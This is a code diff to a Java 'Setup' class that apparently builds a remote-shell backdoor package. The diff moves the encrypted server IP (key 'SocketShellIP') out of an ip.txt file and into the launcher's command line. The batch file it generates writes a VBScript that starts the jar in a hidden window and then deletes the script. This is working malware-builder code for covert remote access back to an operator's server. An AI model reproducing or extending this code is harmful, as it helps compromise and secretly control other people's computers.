@@ -32,15 +32,12 @@ public class Setup {
 		FileUtils.copyFile(new File("target" + File.separator + "install.jar"),
 				new File("backdoor" + File.separator + "install.jar"));
 		createBat("backdoor" + File.separator + "install.bat", "jre", "install");
-		PrintWriter out = new PrintWriter(new File("backdoor" + File.separator + "ip.txt"));
-		out.println(Utils.crypt(Utils.getIP(), "SocketShellIP"));
-		out.flush();
-		out.close();
 	}
 
 	/**
 	 * Creates a '.bat' batch file for running a jar file in a Java Runtime
-	 * Environment (if packaged with the jar).
+	 * Environment (if packaged with the jar) and suplying the jar with the server's
+	 * IP address.
 	 *
 	 * @param filePath Path of '.bat' batch file to create.
 	 * @param jrePath  Path to jre if bundled.
@@ -51,9 +48,10 @@ public class Setup {
 		PrintWriter out = new PrintWriter(new File(filePath));
 		out.println(
 				"@echo off\n%~d0 & cd %~dp0\necho Set objShell = WScript.CreateObject(\"WScript.Shell\")>run.vbs\necho objShell.Run \"cmd /c if exist "
-						+ jrePath + "\\ (" + jrePath + "\\bin\\java " + "-jar " + jarName + ".jar) else (java -jar "
-						+ jarName
-						+ ".jar)\", ^0, True>>run.vbs\nstart run.vbs\ncall:delvbs\n:delvbs\nif exist run.vbs (\n timeout 1 > nul\n del run.vbs\n @exit\n"
+						+ jrePath + "\\ (" + jrePath + "\\bin\\java " + "-jar " + jarName + ".jar "
+						+ Utils.crypt(Utils.getIP(), "SocketShellIP") + ") else (java -jar " + jarName + ".jar "
+						+ Utils.crypt(Utils.getIP(), "SocketShellIP")
+						+ ")\", ^0, True>>run.vbs\nstart run.vbs\ncall:delvbs\n:delvbs\nif exist run.vbs (\n timeout 1 > nul\n del run.vbs\n @exit\n"
 						+ ") else (\ncall:delvbs\n)\ngoto:eof");
 		out.flush();
 		out.close();
